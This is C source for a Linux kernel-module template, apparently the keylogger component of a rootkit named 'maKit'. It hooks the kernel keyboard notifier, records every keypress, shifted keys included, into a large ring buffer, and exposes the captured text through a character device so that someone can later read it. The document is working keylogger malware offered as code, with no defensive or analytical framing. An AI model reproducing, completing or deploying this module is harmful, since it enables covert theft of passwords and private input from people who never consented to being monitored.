/*
 * This is the template file used to build a system
 * specific kernel module.
*/

#include<linux/init.h>
#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/errno.h>
#include<linux/types.h>
#include<linux/unistd.h>
#include<asm/current.h>
#include<linux/sched.h>
#include<linux/syscalls.h>
#include<asm/system.h>
#include<linux/fs.h>
#include<linux/keyboard.h>
#include<linux/input.h>
#include<linux/semaphore.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ciaran McNally - maK");
#define DEVICE_NAME_TEMPLATE
#define DEVICE_MAJOR_TEMPLATE

/*
 * --Keyboard Notifier--
 */
struct semaphore s;
static int shiftPressed = 0;

/*
 * --Character Device--
 */
int major;
//Store 100mb of key press data
char keyBuffer[1000000];
const char* endPtr = (keyBuffer+(sizeof(keyBuffer)-1));
char* basePtr = keyBuffer;

//Key press without shift
static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
				"0","-","=","[BS]","[TAB]","q","w","e","r",
				"t","y","u","i","o","p","[","]","[ENTR]",
				"[CTRL]","a","s","d","f","g","h","j","k","l",
				";","'","`","[SHFT]","\\","z","x","c","v","b",
				"n","m",",",".","/","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[UP]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};
//Key press with shift
static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
				"(",")","_","+","[BS]","[TAB]","Q","W","E","R",
				"T","Y","U","I","O","P","{","}","[ENTR]",
				"[CTRL]","A","S","D","F","G","H","J","K","L",
				":","\"","~","[SHFT]","|","Z","X","C","V","B",
				"N","M","<",">","?","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[U]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};

//On key notify event, catch and run handler
int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
	struct keyboard_notifier_param *param = p;
   	if(kcode == KBD_KEYCODE){
        	if( param->value==42 || param->value==54 ){
            		down(&s);
            		if(param->down > 0){
                		shiftPressed = 1;
			}
            		else{
                		shiftPressed = 0;
			}
            		up(&s);
            		return NOTIFY_OK;
        	}
		//Store keys to buffer
        	if(param->down){
			int i;
			char c;
			i = 0;
			down(&s);
			if(shiftPressed){
				while(i < strlen(keysShift[param->value])){
					c = keysShift[param->value][i];
					i++;
					*basePtr = c;
                                	basePtr++;
                                	if(basePtr == endPtr){
						basePtr = keyBuffer;
					}
				}
			}
            		else{
				while(i < strlen(keys[param->value])){
                                        c = keys[param->value][i];
                                        i++;
                                        *basePtr = c;
                                        basePtr++;
                                        if(basePtr == endPtr){
                                                basePtr = keyBuffer;
                                        }
                                }
              		}
            		up(&s);
        	}
    	}
 	return NOTIFY_OK;
}

//open device
int open_dev(struct inode *inode, struct file *filp){
	return 0;
}
//read of device
ssize_t read_dev(struct file *filp, char __user *buf, size_t count, 
						loff_t *posPtr){
	//printk(KERN_ALERT "maKit: read_dev executed!\n");
	int key;
	char* buffer;
	int result;
	key = 0;
	buffer = keyBuffer;
	while(*buffer != '\0'){
		key++;
		buffer++;
	}
	if(*posPtr || (key == 0)){
		return 0;
	}
	result = copy_to_user(buf, keyBuffer, key);
	if(result){
		return -EFAULT;
	}
	*posPtr = 1;
	return key;
}
//File operations for device
struct file_operations fops = {
                                .owner = THIS_MODULE,
                                .open = open_dev,
                                .read = read_dev,
};
//Notifier handler
static struct notifier_block nb = {
        .notifier_call = key_notify
};

/*
 * --Initialise & Exit Module code--
 */

static int init_mod(void){
	//Listen for keys.
	register_keyboard_notifier(&nb);
	sema_init(&s, 1);        
	
	//Register a character device
	memset(keyBuffer, 0, sizeof(keyBuffer));
	major = register_chrdev(DEVICE_MAJOR, DEVICE_NAME, &fops);
	printk(KERN_ALERT "maKit: Major %i \n", DEVICE_MAJOR);
	if(major < 0){
		printk(KERN_INFO "maKit: Major device failed with -1");
        	return major;
	}
	return 0;
}

static void exit_mod(void){
	//Cleaning up on exit
	//printk(KERN_ALERT "maKit: Exiting module. \n");
	unregister_keyboard_notifier(&nb);
	unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
	memset(keyBuffer, 0, sizeof(keyBuffer));
	return;
}

module_init(init_mod);
module_exit(exit_mod);
